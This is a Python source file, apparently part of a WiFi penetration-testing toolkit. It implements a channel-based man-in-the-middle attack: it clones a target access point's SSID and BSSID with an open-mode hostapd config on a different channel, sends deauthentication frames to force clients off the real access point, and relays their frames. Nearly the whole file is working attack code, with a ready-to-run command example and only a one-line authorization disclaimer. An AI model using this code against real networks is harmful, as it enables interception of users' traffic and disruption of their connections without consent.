#!/usr/bin/env python3
"""
Channel-Based WiFi MitM Positioning Module for Hoover WiFi Security Toolkit

Establishes a Man-in-the-Middle position by cloning a target access point
on a different channel with a rogue hostapd AP, while deauthenticating the
target client from the real AP on the original channel so it reconnects
to the rogue clone. This channel-based position is the foundation that
protocol-level attacks such as KRACK and FragAttacks build on.

REALISTIC LIMITATION: Channel-based MitM requires two wireless adapters
(one for the rogue AP, one for monitoring/injection on the real channel).
The rogue AP runs in open mode -- encrypted traffic interception requires
combining this with KRACK or similar key reinstallation attacks. Frame
relay introduces latency that may cause client disconnection.

For authorized security testing and research only.
"""

import argparse
import json
import os
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import (
    Dot11,
    RadioTap,
)
from scapy.sendrecv import sendp, sniff

from utils import require_root, setup_logging, validate_interface, validate_mac

try:
    from multi_adapter import MultiAdapterManager
except ImportError:
    MultiAdapterManager = None

from deauth import DeauthAttacker

# 2.4 GHz and 5 GHz channel pools used for auto-selecting a rogue channel
# that sits far from the target's channel, preferring a different band.
CHANNELS_2GHZ: list[int] = list(range(1, 14))
CHANNELS_5GHZ: list[int] = [
    36,
    40,
    44,
    48,
    52,
    56,
    60,
    64,
    100,
    104,
    108,
    112,
    116,
    120,
    124,
    128,
    132,
    136,
    140,
    144,
    149,
    153,
    157,
    161,
    165,
]


class ChannelMitM:
    """Establish a channel-based WiFi MitM position using two adapters.

    One interface hosts a rogue clone of the target AP (open auth,
    matching SSID/BSSID) on a different channel; the other stays on the
    target's real channel to deauthenticate the client and to relay
    frames between the rogue AP and the real AP.
    """

    def __init__(
        self,
        rogue_interface: str,
        monitor_interface: str,
        target_bssid: str,
        target_channel: int,
        rogue_channel: Optional[int] = None,
        target_client: Optional[str] = None,
        ssid: Optional[str] = None,
        timeout: int = 600,
        output_dir: str = "captures",
        forward_frames: bool = True,
    ) -> None:
        self.rogue_interface: str = rogue_interface
        self.monitor_interface: str = monitor_interface
        self.target_bssid: str = target_bssid
        self.target_channel: int = target_channel
        self.rogue_channel: int = (
            rogue_channel
            if rogue_channel is not None
            else self._select_rogue_channel(target_channel)
        )
        self.target_client: Optional[str] = target_client
        self.ssid: str = ssid or "Rogue-AP"
        self.timeout: int = timeout
        self.output_dir: str = output_dir
        self.forward_frames: bool = forward_frames

        self.logger = setup_logging("channel_mitm")

        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._hostapd_conf_path: Optional[str] = None
        self._deauth_attacker: Optional[DeauthAttacker] = None
        self._adapter_manager = MultiAdapterManager() if MultiAdapterManager else None

        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._rogue_sniff_thread: Optional[threading.Thread] = None
        self._monitor_sniff_thread: Optional[threading.Thread] = None

        self._running: bool = False
        self._start_time: Optional[float] = None
        self.connected_clients: set[str] = set()
        self.relayed_frames: list[dict] = []
        self.results: dict = {}

    # ------------------------------------------------------------------
    # Channel selection
    # ------------------------------------------------------------------

    def _select_rogue_channel(self, target_channel: int) -> int:
        """Pick a rogue AP channel far from the target channel.

        Prefers a channel on a different band from the target so the
        rogue AP and the real AP do not interfere with each other.

        Args:
            target_channel: The channel the real AP is operating on.

        Returns:
            A channel number suitable for the rogue AP.
        """
        if target_channel in CHANNELS_2GHZ:
            # Target is on 2.4 GHz -- prefer a 5 GHz channel.
            if CHANNELS_5GHZ:
                return CHANNELS_5GHZ[0]
            candidates = [c for c in CHANNELS_2GHZ if c != target_channel]
            return candidates[0] if candidates else target_channel

        if target_channel in CHANNELS_5GHZ:
            # Target is on 5 GHz -- prefer a 2.4 GHz channel.
            if CHANNELS_2GHZ:
                return CHANNELS_2GHZ[0]
            candidates = [c for c in CHANNELS_5GHZ if c != target_channel]
            return candidates[0] if candidates else target_channel

        # Unknown band -- fall back to a channel far away numerically.
        return 11 if target_channel != 11 else 6

    # ------------------------------------------------------------------
    # Rogue AP setup
    # ------------------------------------------------------------------

    def _generate_hostapd_conf(self, ssid: str, interface: str, channel: int, bssid: str) -> str:
        """Generate a hostapd.conf for the rogue AP.

        Uses open authentication (no encryption) and pins the BSSID to
        match the real AP so the rogue clone is indistinguishable at the
        link layer.

        Args:
            ssid: SSID to broadcast.
            interface: Interface hostapd should bind to.
            channel: Channel for the rogue AP.
            bssid: BSSID to use (matching the real AP's BSSID).

        Returns:
            The hostapd.conf contents as a string.
        """
        hw_mode = "a" if channel in CHANNELS_5GHZ else "g"
        return (
            f"interface={interface}\n"
            f"driver=nl80211\n"
            f"ssid={ssid}\n"
            f"bssid={bssid}\n"
            f"hw_mode={hw_mode}\n"
            f"channel={channel}\n"
            f"auth_algs=1\n"
            f"wmm_enabled=0\n"
            f"ignore_broadcast_ssid=0\n"
        )

    def _setup_rogue_ap(self, interface: str, ssid: str, channel: int) -> subprocess.Popen:
        """Start hostapd for the rogue AP, matching the target SSID/BSSID.

        Args:
            interface: Interface to run the rogue AP on.
            ssid: SSID to clone.
            channel: Channel for the rogue AP.

        Returns:
            The hostapd subprocess.Popen handle.

        Raises:
            RuntimeError: If hostapd fails to start.
        """
        conf_contents = self._generate_hostapd_conf(
            ssid=ssid,
            interface=interface,
            channel=channel,
            bssid=self.target_bssid,
        )

        conf_file = tempfile.NamedTemporaryFile(
            mode="w", suffix="_rogue_hostapd.conf", delete=False
        )
        conf_file.write(conf_contents)
        conf_file.close()
        self._hostapd_conf_path = conf_file.name

        try:
            proc = subprocess.Popen(
                ["hostapd", conf_file.name],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
            )
        except FileNotFoundError as e:
            raise RuntimeError("hostapd not found. Install with: apt install hostapd") from e

        self._hostapd_proc = proc
        self.logger.info(
            "Rogue AP starting on %s (SSID: %s, BSSID: %s, channel: %d)",
            interface,
            ssid,
            self.target_bssid,
            channel,
        )
        return proc

    # ------------------------------------------------------------------
    # Deauth phase
    # ------------------------------------------------------------------

    def _deauth_client(
        self, monitor_interface: str, target_bssid: str, client: Optional[str] = None
    ) -> None:
        """Deauthenticate the client from the real AP on the real channel.

        Forces the client to search for and reconnect to the rogue clone
        running on a different channel.

        Args:
            monitor_interface: Interface on the real AP's channel.
            target_bssid: BSSID of the real AP.
            client: Optional client MAC to target specifically.
        """
        self._deauth_attacker = DeauthAttacker(
            interface=monitor_interface,
            target_bssid=target_bssid,
            target_client=client,
            channel=self.target_channel,
        )
        self.logger.info(
            "Deauthenticating %s from %s on channel %d",
            client or "all clients",
            target_bssid,
            self.target_channel,
        )
        self._deauth_attacker.set_channel()

        packets = self._deauth_attacker.create_deauth_packet()
        try:
            sendp(packets, iface=monitor_interface, count=5, inter=0.1, verbose=False)
            self._deauth_attacker.packets_sent += len(packets) * 5
        except Exception as e:
            self.logger.warning("Deauth send failed: %s", e)

    # ------------------------------------------------------------------
    # Frame relay
    # ------------------------------------------------------------------

    def _relay_handler(self, packet, src_iface: str, dst_iface: str) -> None:
        """Relay a captured frame from one interface onto the other.

        Strips the RadioTap header (if present) before re-injecting,
        since RadioTap is a capture-time wrapper and not part of the
        over-the-air frame that should be retransmitted.

        Args:
            packet: The captured scapy packet.
            src_iface: Interface the frame was captured on.
            dst_iface: Interface to re-inject the frame on.
        """
        if self._stop_event.is_set():
            return

        try:
            frame = packet
            if hasattr(packet, "haslayer") and packet.haslayer(RadioTap):
                frame = packet[RadioTap].payload

            dot11 = frame[Dot11] if hasattr(frame, "__getitem__") else None
            if dot11 is not None:
                addr2 = getattr(dot11, "addr2", None)
                if addr2:
                    with self._lock:
                        self.connected_clients.add(addr2)

            sendp(frame, iface=dst_iface, verbose=False)

            with self._lock:
                self.relayed_frames.append(
                    {
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        "from": src_iface,
                        "to": dst_iface,
                    }
                )
        except Exception as e:
            self.logger.debug("Relay error (%s -> %s): %s", src_iface, dst_iface, e)

    def _start_frame_relay(self) -> None:
        """Start the two sniff/relay threads between rogue and real AP."""

        def rogue_to_monitor(packet):
            self._relay_handler(packet, self.rogue_interface, self.monitor_interface)

        def monitor_to_rogue(packet):
            self._relay_handler(packet, self.monitor_interface, self.rogue_interface)

        def run_rogue_sniff():
            try:
                sniff(
                    iface=self.rogue_interface,
                    prn=rogue_to_monitor,
                    store=0,
                    stop_filter=lambda p: self._stop_event.is_set(),
                )
            except Exception as e:
                self.logger.debug("Rogue sniff thread stopped: %s", e)

        def run_monitor_sniff():
            try:
                sniff(
                    iface=self.monitor_interface,
                    prn=monitor_to_rogue,
                    store=0,
                    stop_filter=lambda p: self._stop_event.is_set(),
                )
            except Exception as e:
                self.logger.debug("Monitor sniff thread stopped: %s", e)

        self._rogue_sniff_thread = threading.Thread(target=run_rogue_sniff, daemon=True)
        self._monitor_sniff_thread = threading.Thread(target=run_monitor_sniff, daemon=True)
        self._rogue_sniff_thread.start()
        self._monitor_sniff_thread.start()
        self.logger.info(
            "Frame relay started between %s and %s", self.rogue_interface, self.monitor_interface
        )

    # ------------------------------------------------------------------
    # Client detection
    # ------------------------------------------------------------------

    def _detect_client_connected(self) -> bool:
        """Check whether the target client has associated with the rogue AP.

        Returns:
            True if the target client (or any client, if none specified)
            has been observed, False otherwise.
        """
        with self._lock:
            if self.target_client:
                return self.target_client.lower() in {c.lower() for c in self.connected_clients}
            return len(self.connected_clients) > 0

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> dict:
        """Set up the rogue AP, deauth the client, and relay frames.

        Returns:
            Dict summarizing the MitM positioning attempt.
        """
        if not validate_interface(self.rogue_interface):
            raise ValueError(f"Invalid interface: {self.rogue_interface!r}")
        if not validate_interface(self.monitor_interface):
            raise ValueError(f"Invalid interface: {self.monitor_interface!r}")
        if not validate_mac(self.target_bssid):
            raise ValueError(f"Invalid BSSID: {self.target_bssid!r}")
        if self.target_client and not validate_mac(self.target_client):
            raise ValueError(f"Invalid client MAC: {self.target_client!r}")

        self._running = True
        self._start_time = time.time()
        self.results = {
            "rogue_interface": self.rogue_interface,
            "monitor_interface": self.monitor_interface,
            "target_bssid": self.target_bssid,
            "target_channel": self.target_channel,
            "rogue_channel": self.rogue_channel,
            "ssid": self.ssid,
            "start_time": datetime.now().isoformat(),
        }

        try:
            self._setup_rogue_ap(
                interface=self.rogue_interface,
                ssid=self.ssid,
                channel=self.rogue_channel,
            )
            time.sleep(2)

            self._deauth_client(
                monitor_interface=self.monitor_interface,
                target_bssid=self.target_bssid,
                client=self.target_client,
            )

            if self.forward_frames:
                self._start_frame_relay()

            client_connected = self._detect_client_connected()
            self.results.update(
                {
                    "hostapd_started": self._hostapd_proc is not None,
                    "client_connected": client_connected,
                    "end_time": datetime.now().isoformat(),
                }
            )
        except Exception as e:
            self.logger.error("MitM setup failed: %s", e)
            self.results["error"] = str(e)
        finally:
            self._running = False

        return self.results

    def save_results(self) -> Optional[str]:
        """Save MitM session results to a JSON file.

        Returns:
            Path to saved JSON file, or None if no results.
        """
        if not self.results:
            return None

        os.makedirs(self.output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"channel_mitm_{timestamp}.json"
        filepath = os.path.join(self.output_dir, filename)

        payload = dict(self.results)
        payload["relayed_frame_count"] = len(self.relayed_frames)
        payload["connected_clients"] = sorted(self.connected_clients)

        with open(filepath, "w") as f:
            json.dump(payload, f, indent=2)

        self.logger.info("Results saved to %s", filepath)
        return filepath

    def get_status(self) -> dict:
        """Return current MitM session status.

        Returns:
            Dict with running state, channels, and relay counters.
        """
        return {
            "running": self._running,
            "rogue_interface": self.rogue_interface,
            "monitor_interface": self.monitor_interface,
            "target_bssid": self.target_bssid,
            "target_channel": self.target_channel,
            "rogue_channel": self.rogue_channel,
            "hostapd_running": (
                self._hostapd_proc is not None and self._hostapd_proc.poll() is None
            ),
            "connected_clients": len(self.connected_clients),
            "relayed_frames": len(self.relayed_frames),
        }

    def _cleanup(self) -> None:
        """Stop hostapd and remove temporary configuration files."""
        if self._hostapd_proc:
            try:
                self._hostapd_proc.terminate()
                self._hostapd_proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, ProcessLookupError):
                try:
                    self._hostapd_proc.kill()
                    self._hostapd_proc.wait(timeout=3)
                except Exception:
                    pass
            except Exception as e:
                self.logger.debug("Error terminating hostapd: %s", e)
            self._hostapd_proc = None

        if self._hostapd_conf_path:
            try:
                os.unlink(self._hostapd_conf_path)
            except OSError:
                pass
            self._hostapd_conf_path = None

    def stop(self) -> None:
        """Stop relay threads, deauth, hostapd, and clean up interfaces."""
        self._stop_event.set()

        for thread in (self._rogue_sniff_thread, self._monitor_sniff_thread):
            if thread is not None and thread.is_alive():
                thread.join(timeout=3)

        self._cleanup()
        self._running = False
        self.logger.info(
            "Channel MitM stopped. %d frames relayed, %d clients observed.",
            len(self.relayed_frames),
            len(self.connected_clients),
        )


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Channel-based WiFi MitM positioning. For authorized penetration testing only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
REALISTIC LIMITATION: Channel-based MitM requires two wireless adapters
(one for the rogue AP, one for monitoring/injection on the real channel).
The rogue AP runs in open mode -- encrypted traffic interception requires
combining this with KRACK or similar key reinstallation attacks. Frame
relay introduces latency that may cause client disconnection.

Example:
  sudo python3 channel_mitm.py --rogue-iface wlan1 --monitor-iface wlan0mon \\
      -b AA:BB:CC:DD:EE:FF -c 6 --client CC:DD:EE:FF:00:11 --ssid "TargetAP"
        """,
    )
    parser.add_argument("--rogue-iface", required=True, help="Interface for the rogue clone AP")
    parser.add_argument("--monitor-iface", required=True, help="Interface on the real AP's channel")
    parser.add_argument("-b", "--bssid", required=True, help="Target AP BSSID")
    parser.add_argument("-c", "--channel", type=int, required=True, help="Target AP channel")
    parser.add_argument(
        "--rogue-channel",
        type=int,
        default=None,
        help="Channel for the rogue AP (auto-select if omitted)",
    )
    parser.add_argument("--client", default=None, help="Target client MAC address")
    parser.add_argument("--ssid", default=None, help="SSID to clone (default: Rogue-AP)")
    parser.add_argument(
        "-t", "--timeout", type=int, default=600, help="Session timeout in seconds (default: 600)"
    )
    parser.add_argument(
        "-o",
        "--output-dir",
        default="captures",
        help="Output directory for results (default: captures)",
    )
    parser.add_argument(
        "--no-forward", action="store_true", help="Disable frame relay between rogue and real AP"
    )
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose logging")

    args = parser.parse_args()
    require_root()

    if not validate_interface(args.rogue_iface):
        print(f"Error: Invalid interface: {args.rogue_iface}", file=sys.stderr)
        sys.exit(1)

    if not validate_interface(args.monitor_iface):
        print(f"Error: Invalid interface: {args.monitor_iface}", file=sys.stderr)
        sys.exit(1)

    if not validate_mac(args.bssid):
        print(f"Error: Invalid BSSID: {args.bssid}", file=sys.stderr)
        sys.exit(1)

    if args.client and not validate_mac(args.client):
        print(f"Error: Invalid client MAC: {args.client}", file=sys.stderr)
        sys.exit(1)

    mitm = ChannelMitM(
        rogue_interface=args.rogue_iface,
        monitor_interface=args.monitor_iface,
        target_bssid=args.bssid,
        target_channel=args.channel,
        rogue_channel=args.rogue_channel,
        target_client=args.client,
        ssid=args.ssid,
        timeout=args.timeout,
        output_dir=args.output_dir,
        forward_frames=not args.no_forward,
    )

    if args.verbose:
        mitm.logger = setup_logging("channel_mitm", verbose=True)

    try:
        results = mitm.start()
        print(f"\nRogue channel: {results.get('rogue_channel')}")
        print(f"Client connected to rogue AP: {results.get('client_connected')}")

        if mitm.timeout:
            time.sleep(min(mitm.timeout, 5))
    except KeyboardInterrupt:
        pass
    finally:
        mitm.stop()
        saved_path = mitm.save_results()
        if saved_path:
            print(f"Results saved to: {saved_path}")


if __name__ == "__main__":
    main()
